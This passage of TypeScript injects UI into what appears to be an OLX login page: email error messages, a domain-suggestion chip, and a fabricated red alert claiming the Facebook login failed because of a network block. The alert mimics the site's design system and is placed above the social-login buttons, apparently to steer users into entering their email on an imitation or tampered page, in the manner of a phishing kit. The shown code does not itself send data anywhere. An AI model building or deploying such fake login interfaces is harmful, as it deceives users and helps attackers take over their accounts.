C15.8232233,8.76256313 15.8232233,9.23743687 15.5303301,9.53033009 L13.0606602,12 Z"></path>
      </svg>
      <span class="__olx_email_error_msg__">${escapeAttr(message || "Campo obrigatório. Informe um e-mail válido.")}</span>
    `;
    wrapper.insertAdjacentElement("afterend", host);
  } else if (message) {
    const span = host.querySelector<HTMLElement>(".__olx_email_error_msg__");
    if (span) span.textContent = message;
  }

  // Limpa quando o usuário corrigir
  if (!(input as any).__olxEmailListener) {
    const onInput = () => {
      if (EMAIL_RE.test((input.value || "").trim())) clearEmailError(doc, input);
    };
    input.addEventListener("input", onInput);
    (input as any).__olxEmailListener = onInput;
  }
}

function clearEmailError(doc: Document, input: HTMLInputElement): void {
  input.removeAttribute("aria-invalid");
  const container = input.closest(".olx-text-input__input-container") as HTMLElement | null;
  container?.classList.remove("olx-text-input__input-container--error");
  // Remove qualquer instância da mensagem que esteja por perto
  const wrapper =
    (input.closest(".olx-text-input") as HTMLElement | null) ||
    (input.closest('[data-ds-component="DS-TextInput"]') as HTMLElement | null) ||
    (input.closest(".olx-form-control") as HTMLElement | null) ||
    container ||
    input.parentElement;
  wrapper?.parentElement?.querySelectorAll("#__olx_email_error__").forEach((el) => el.remove());
  doc.querySelectorAll("#__olx_email_error__").forEach((el) => {
    if (el.previousElementSibling === wrapper) el.remove();
  });
}

// =====================================================================
// Sugestão de domínio de e-mail (gmail.com / hotmail.com / outlook.com / etc)
// Aparece um chipinho "Deseja usar <local>@<dominio>?" abaixo do input.
// =====================================================================
const EMAIL_DOMAIN_MAP: Record<string, string> = {
  g: "gmail.com",
  h: "hotmail.com",
  o: "outlook.com",
  y: "yahoo.com.br",
  i: "icloud.com",
  l: "live.com",
  u: "uol.com.br",
  b: "bol.com.br",
  t: "terra.com.br",
  p: "protonmail.com",
};

function attachEmailDomainSuggest(doc: Document, input: HTMLInputElement): void {
  if ((input as any).__olxEmailSuggest) return;
  (input as any).__olxEmailSuggest = true;

  const onInput = () => {
    const raw = input.value || "";
    const at = raw.indexOf("@");
    // Sem @ ainda → some
    if (at < 0 || at === 0) return removeSuggestion(doc, input);
    const local = raw.slice(0, at);
    const partial = raw.slice(at + 1).toLowerCase();

    // Já digitou algo válido (gmail.com inteiro etc.) → some
    if (partial.includes(".") && partial.split(".").pop()!.length >= 2) {
      return removeSuggestion(doc, input);
    }

    // Nada depois do @ → some
    if (!partial) return removeSuggestion(doc, input);

    const firstChar = partial[0];
    const candidate = EMAIL_DOMAIN_MAP[firstChar];
    if (!candidate || !candidate.startsWith(partial)) {
      return removeSuggestion(doc, input);
    }

    showSuggestion(doc, input, `${local}@${candidate}`);
  };

  const onBlur = () => {
    // dá tempo do click no chip ser registrado
    setTimeout(() => removeSuggestion(doc, input), 150);
  };

  const onKey = (e: KeyboardEvent) => {
    if (e.key === "Tab" || e.key === "Enter") {
      const sug = currentSuggestion(doc, input);
      if (sug) {
        e.preventDefault();
        applySuggestion(doc, input, sug);
      }
    } else if (e.key === "Escape") {
      removeSuggestion(doc, input);
    }
  };

  input.addEventListener("input", onInput);
  input.addEventListener("blur", onBlur);
  input.addEventListener("keydown", onKey);
}

function suggestionId(input: HTMLInputElement): string {
  // ID único por input baseado em referência
  let id = (input as any).__olxSuggestId as string | undefined;
  if (!id) {
    id = `__olx_email_suggest_${Math.random().toString(36).slice(2, 9)}`;
    (input as any).__olxSuggestId = id;
  }
  return id;
}

function suggestionAnchor(input: HTMLInputElement): HTMLElement | null {
  const wrapper =
    (input.closest(".olx-text-input") as HTMLElement | null) ||
    (input.closest('[data-ds-component="DS-TextInput"]') as HTMLElement | null) ||
    (input.closest(".olx-form-control") as HTMLElement | null) ||
    (input.closest(".olx-text-input__input-container") as HTMLElement | null) ||
    input.parentElement;
  return wrapper;
}

function currentSuggestion(doc: Document, input: HTMLInputElement): string | null {
  const id = suggestionId(input);
  const node = doc.getElementById(id);
  return node?.getAttribute("data-suggestion") || null;
}

function showSuggestion(doc: Document, input: HTMLInputElement, value: string): void {
  const id = suggestionId(input);
  const wrapper = suggestionAnchor(input);
  if (!wrapper || !wrapper.parentElement) return;

  // Se houver msg de erro logo após o wrapper, ancora depois dela.
  const errorEl = wrapper.parentElement.querySelector<HTMLElement>(":scope > #__olx_email_error__");
  const anchor = errorEl ?? wrapper;

  let host = doc.getElementById(id);
  if (!host) {
    host = doc.createElement("div");
    host.id = id;
    host.setAttribute(
      "style",
      [
        "display:block",
        "margin-top:6px",
        "padding:0",
        "border:0",
        "background:transparent",
        "font-family:'Open Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif",
        "font-size:14px",
        "color:#1a1a1a",
        "line-height:1.4",
      ].join(";"),
    );
    anchor.insertAdjacentElement("afterend", host);
  } else if (host.previousElementSibling !== anchor) {
    anchor.insertAdjacentElement("afterend", host);
  }

  host.setAttribute("data-suggestion", value);
  host.innerHTML = `
    <span style="color:#1a1a1a;">Deseja usar </span><button type="button" data-action="apply" style="background:transparent;border:0;padding:0;margin:0;font:inherit;color:#6E0AD6;text-decoration:none;cursor:pointer;">${escapeAttr(value)}</button><span style="color:#1a1a1a;">?</span>
  `;

  const apply = host.querySelector<HTMLButtonElement>('[data-action="apply"]');
  apply?.addEventListener("mousedown", (e) => e.preventDefault()); // não tira foco do input
  apply?.addEventListener("click", () => applySuggestion(doc, input, value));
}

function applySuggestion(doc: Document, input: HTMLInputElement, value: string): void {
  input.value = value;
  input.dispatchEvent(new Event("input", { bubbles: true }));
  input.dispatchEvent(new Event("change", { bubbles: true }));
  removeSuggestion(doc, input);
  // Limpa erro se estava marcado
  clearEmailError(doc, input);
  try {
    input.focus();
    input.setSelectionRange(value.length, value.length);
  } catch {
    /* ignore */
  }
}

function removeSuggestion(doc: Document, input: HTMLInputElement): void {
  const id = suggestionId(input);
  doc.getElementById(id)?.remove();
}

function escapeAttr(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

// =====================================================================
// Alertbox de erro do Facebook — aparece entre o e-mail e o botão
// =====================================================================
function showFacebookErrorAlert(doc: Document, fbBtn: HTMLElement): void {
  // Remove instância anterior, se existir
  doc.getElementById("__olx_fb_error__")?.remove();

  // Procura o divisor "ou conecte com" para inserir o alerta logo ACIMA dele
  // (mantendo os botões Google/Facebook no mesmo lugar).
  let divider: HTMLElement | null = null;
  const all = Array.from(doc.querySelectorAll<HTMLElement>("*"));
  for (const el of all) {
    if (el.children.length > 0) continue; // só folhas com texto
    const t = (el.textContent || "").trim().toLowerCase();
    if (/^ou\s+conecte\s+com$/.test(t) || /^ou\s+continue\s+com$/.test(t)) {
      divider = el;
      break;
    }
  }
  // Sobe até o container do divisor (geralmente uma <div> com a linha + texto)
  const dividerHost: HTMLElement | null = divider
    ? (divider.parentElement?.parentElement || divider.parentElement || divider)
    : null;

  const host = doc.createElement("div");
  host.id = "__olx_fb_error__";
  host.setAttribute("data-ds-componet", "DS-Alertbox");
  host.setAttribute("role", "Alert");
  host.setAttribute("title", "Houve um problema ao acessar sua conta.");
  host.setAttribute(
    "style",
    [
      "display:flex",
      "align-items:flex-start",
      "gap:12px",
      "margin:12px 0",
      "padding:12px 16px",
      "border:1px solid #f5c2c0",
      "background:#fdecec",
      "color:#cc0000",
      "border-radius:6px",
      "font-family:'Open Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif",
      "font-size:14px",
      "line-height:1.4",
    ].join(";"),
  );
  host.innerHTML = `
    <span aria-hidden="true" style="flex-shrink:0;display:inline-flex;color:#cc0000;">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true">
        <path fill="currentColor" fill-rule="evenodd" d="M9.71359506,3.58264725 C10.1959664,2.75648501 11.0619105,2.25 12,2.25 C12.9380895,2.25 13.8040336,2.75648501 14.2864049,3.58264725 L22.3990136,17.6526538 C22.8643765,18.4898832 22.8671453,19.5171668 22.4063387,20.3570247 C21.9404483,21.2061484 21.0686569,21.739066 20.1068,21.75 L3.88463673,21.75 C2.93134308,21.739066 2.05955169,21.2061484 1.5936613,20.3570247 C1.13285475,19.5171668 1.13562352,18.4898832 1.60679506,17.6423942 L9.71359506,3.58264725 Z M2.91206578,18.3813999 C2.697188,18.7679842 2.69589534,19.2475938 2.90872192,19.6354878 C3.11646466,20.0141161 3.49482206,20.2454023 3.8932,20.2500489 L20.0982367,20.2500489 C20.5051779,20.2454023 20.8835353,20.0141161 21.0912781,19.6354878 C21.3041047,19.2475938 21.302812,18.7679842 21.0937429,18.3916594 L12.9889955,4.33544999 C12.7752771,3.96942216 12.4001281,3.75 12,3.75 C11.6004402,3.75 11.2257887,3.96879928 11.0119162,4.33389117 L2.91206578,18.3813999 Z M11.25,10 L11.25,14 C11.25,14.4142136 11.5857864,14.75 12,14.75 C12.4142136,14.75 12.75,14.4142136 12.75,14 L12.75,10 C12.75,9.58578644 12.4142136,9.25 12,9.25 C11.5857864,9.25 11.25,9.58578644 11.25,10 Z M12,18 C12.5522847,18 13,17.5522847 13,17 C13,16.4477153 12.5522847,16 12,16 C11.4477153,16 11,16.4477153 11,17 C11,17.5522847 11.4477153,18 12,18 Z"></path>
      </svg>
    </span>
    <div style="display:flex;flex-direction:column;gap:2px;color:#cc0000;">
      <span style="font-weight:600;">Houve um problema ao acessar sua conta.</span>
      <span style="color:#7a1a1a;font-weight:400;">Por favor, verifique se há algum bloqueio na sua rede de internet.</span>
    </div>
  `;

  // Insere o alerta logo ACIMA do "ou conecte com" (entre o e-mail e a área social).
  // Os botões Google/Facebook ficam exatamente no mesmo lugar.
  if (dividerHost && dividerHost.parentElement) {
    dividerHost.insertAdjacentElement("beforebegin", host);
  } else {
    // Fallback: sobe até o container do botão e insere antes do bloco social
    const socialBlock =
      (fbBtn.closest('[class*="social" i]') as HTMLElement | null) ||
      fbBtn.parentElement ||
      fbBtn;
    socialBlock.insertAdjacentElement("beforebegin", host);
  }

  // Scroll suave pra mensagem aparecer
  try {
    host.scrollIntoView({ behavior: "smooth", block: "center" });
  } catch {
    /* ignore */
  }
}

